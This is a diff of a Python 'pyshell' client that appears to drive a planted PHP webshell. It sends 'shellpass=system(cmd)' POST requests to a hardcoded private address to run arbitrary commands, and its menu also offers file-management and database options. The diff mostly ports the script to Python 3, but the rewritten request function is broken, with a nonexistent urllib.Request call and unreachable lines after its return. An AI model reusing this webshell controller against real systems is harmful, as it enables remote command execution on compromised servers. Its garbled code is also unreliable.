@@ -9,8 +9,8 @@ import re
 from cmd import Cmd
 import os
 import sys
+import urllib3
 import urllib
-import urllib2
 import requests
 import base64
 import re
@@ -27,27 +27,28 @@ def post(url, data):
     return req.content
 
 def oldpost(url, data):
-    header = {'Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN;'
-    ' rv:1.8.1.14) Gecko/20080404 (FoxPlus) Firefox/2.0.0.14'}
-    # data = "w=%s" % data
-    req = urllib2.Request(url, data=data)
-    req.add_header('User-Agent', header)
-    html = urllib2.urlopen(req)
-    data = html.read()
-    html.close()
-    return data
+	# http = urllib3.PoolManager(timeout = 3)
+	userAgent = 'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6'
+	response = urllib.Request(url, data=data, headers={'User_Agent':userAgent})
+	html = response.data
+	return html
+    # req.add_header('User-Agent', header)
+    html = urllib3.urlopen(req)
+    
+    # html.close()
 
+    
 
 # 执行shell脚本
 def DoShell():
 
 	# url = raw_input('Pls input url:')
-	code = raw_input('Pls input cmd >')
+	code = input('Pls input cmd >')
 	url = 'http://172.28.100.76/1.php'
 
-	data = "shellpass=system({0});".format(code)
+	data = 'shellpass=system({0});'.format(code)
 	response = oldpost(url, data)
-	print response
+	print (response)
 
 # def Showrwx(num):
 # 	permx = {1:'--x', 2:'-w-', 4:'r--', 7:"rwx"}
@@ -124,7 +125,7 @@ def DeleteFile(file):
 if __name__ == '__main__':
 	prompt = "pyshell> "
 	Object = None
-	op = raw_input('Pls input num(1:DoShell;2:files management;3:DB):')
+	op = input('Pls input num(1:DoShell;2:files management;3:DB):')
 	if op == '1':
 		DoShell()
 	elif op == '2':
